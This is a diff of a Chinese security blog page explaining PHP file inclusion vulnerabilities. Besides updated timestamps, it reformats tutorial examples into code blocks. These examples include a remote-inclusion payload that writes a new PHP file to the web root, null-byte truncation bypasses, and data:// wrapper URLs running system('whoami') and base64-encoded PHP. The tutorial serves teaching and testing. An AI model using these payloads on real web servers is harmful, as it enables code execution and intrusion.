@@ -139,7 +139,7 @@
 <meta property="og:image" content="https://i.imgur.com/DFzB7L3.png">
 <meta property="og:image" content="https://i.imgur.com/Tpznihz.png">
 <meta property="og:image" content="https://i.imgur.com/fwBEvdb.png">
-<meta property="og:updated_time" content="2018-12-02T09:14:16.211Z">
+<meta property="og:updated_time" content="2018-12-02T10:56:35.202Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="文件包含漏洞详解">
 <meta name="twitter:description" content="严格来说，文件包含漏洞是“代码注入”的一种，这种攻击其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。 常见的导致文件包含（文件读取）的函数如下： PHP： include()：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。  require()：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。  require">
@@ -417,7 +417,7 @@
                 
               
 
-              <time title="创建时间：2018-12-02 16:01:44 / 修改时间：17:14:16" itemprop="dateCreated datePublished" datetime="2018-12-02T16:01:44+08:00">2018-12-02</time>
+              <time title="创建时间：2018-12-02 16:01:44 / 修改时间：18:56:35" itemprop="dateCreated datePublished" datetime="2018-12-02T16:01:44+08:00">2018-12-02</time>
             
 
             
@@ -511,7 +511,7 @@
 <li><code>allow_url_fopen</code> = On</li>
 <li><code>allow_url_include</code> = On</li>
 </ol>
-<p>在远程文件<a href="http://10.60.17.60里写入测试代码。" target="_blank" rel="noopener">http://10.60.17.60里写入测试代码。</a></p>
+<p>在远程文件<code>http://10.60.17.60</code>里写入测试代码。</p>
 <pre><code>&lt;?php fputs(fopen(&quot;text.php&quot;, &quot;w&quot;), &quot;&lt;?php phpinfo(); ?&gt;&quot;) ?&gt;
 </code></pre><p>  访问<code>http://127.0.0.1/123.php?file=http://10.60.17.46/phpinfo.php</code>。将会在网站根目录下生成text.php文件，内容就是：”<code>&lt;?php phpinfo(); ?&gt;</code>“</p>
 <p><img src="https://i.imgur.com/wgq7QtT.png" alt=""></p>
@@ -543,7 +543,7 @@
 http://127.0.0.1/123.php?file=phpinfo.txt%00
 </code></pre><p><img src="https://i.imgur.com/MkYTX3b.png" alt=""></p>
 <blockquote>
-<p>正常上传图片一句话并访问：<a href="http://test.com/index.php?test=1.jpg会出错，因为包含文件里面不存在1.jpg.php这个文件，但是如果输入http://test.com/index.php?test=1.jpg%00，就极有可能会绕过检测。这种方法只适用于php.ini中`magic_quotes_qpc=off`并且PHP版本小于5.3.4的情况。如果为on，%00会被转义，以至于无法截断。" target="_blank" rel="noopener">http://test.com/index.php?test=1.jpg会出错，因为包含文件里面不存在1.jpg.php这个文件，但是如果输入http://test.com/index.php?test=1.jpg%00，就极有可能会绕过检测。这种方法只适用于php.ini中`magic_quotes_qpc=off`并且PHP版本小于5.3.4的情况。如果为on，%00会被转义，以至于无法截断。</a></p>
+<p>正常上传图片一句话并访问：<code>http://test.com/index.php?test=1.jpg</code>会出错，因为包含文件里面不存在1.jpg.php这个文件，但是如果输入<code>http://test.com/index.php?test=1.jpg%00</code>，就极有可能会绕过检测。这种方法只适用于php.ini中<code>magic_quotes_qpc=off</code>并且PHP版本小于5.3.4的情况。如果为on，%00会被转义，以至于无法截断。</p>
 </blockquote>
 <h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>PHP伪协议其实就是PHP支持的协议和封装的协议，</p>
 <ul>
@@ -565,11 +565,10 @@ http://127.0.0.1/123.php?file=phpinfo.txt%00
 <h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><ul>
 <li>php版本大于等于php5.2</li>
 <li><code>allow_url_fopen</code> = On</li>
-<li><p><code>allow_url_include</code> = On</p>
-<p>  <a href="http://127.0.0.1/123.php?file=data:text/plain" target="_blank" rel="noopener">http://127.0.0.1/123.php?file=data:text/plain</a>,&lt;?php phpinfo();?&gt;</p>
-</li>
+<li><code>allow_url_include</code> = On</li>
 </ul>
-<p>任意命令执行</p>
+<pre><code>http://127.0.0.1/123.php?file=data:text/plain,&lt;?php phpinfo();?&gt;
+</code></pre><p>任意命令执行</p>
 <pre><code>http://127.0.0.1/123.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt;
 </code></pre><p>利用base64编码绕过</p>
 <pre><code>http://127.0.0.1/123.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
